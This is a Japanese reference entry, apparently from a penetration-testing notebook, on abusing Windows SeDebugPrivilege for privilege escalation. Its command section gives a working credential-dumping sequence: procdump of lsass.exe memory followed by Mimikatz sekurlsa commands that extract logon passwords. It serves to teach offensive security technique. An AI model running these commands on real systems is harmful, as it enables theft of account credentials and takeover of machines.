---
title: SeDebugPrivilege の悪用
date: 2026-10-17
category: Windows
topic: 権限昇格
tags: [windows, privilege-escalation, sedebugprivilege]
summary: 任意プロセスへのデバッグアクセスを許す特権。SYSTEM プロセスへのトークン窃取やコード注入の足がかりになる
---

## 概要

`SeDebugPrivilege` は、通常は自分のセッション内のプロセスにしかできないデバッグ操作を、他のユーザー（SYSTEM を含む）が所有するプロセスに対しても行えるようにする特権。本来はデバッガやシステム管理ツールのために存在するが、有効になっていると SYSTEM プロセスのメモリやトークンにアクセスできてしまう。

典型的な悪用は、SYSTEM で動作しているプロセスのアクセストークンを複製して自分のプロセスに適用する「トークン窃取」。これにより、SYSTEM 権限のプロセスを新たに起動できる。Mimikatz の `privilege::debug` はこの特権を有効化する操作そのもので、資格情報ダンプなどの前段としてほぼ必ず叩かれる。

## 手順

1. `whoami /priv` で `SeDebugPrivilege` が有効になっているか確認する（管理者グループのメンバーには既定で割り当てられているが、既定では無効化されており有効化が必要なことが多い）。
2. デバッグ権限で `lsass.exe` のメモリをダンプする。
3. ダンプから資格情報を取り出す（Mimikatz にダンプを読み込ませる）。

## コマンド

```powershell
# SeDebugPrivilege を持っているか確認する
whoami /priv

# LSASS のメモリダンプを取る
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```
# Mimikatz でダンプから資格情報を取り出す
mimikatz # privilege::debug
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## 注意点

- `SeDebugPrivilege` を持つだけでは自動的に有効化されているとは限らず、明示的に有効化する処理（Mimikatz の `privilege::debug` など）が必要な場合がある。
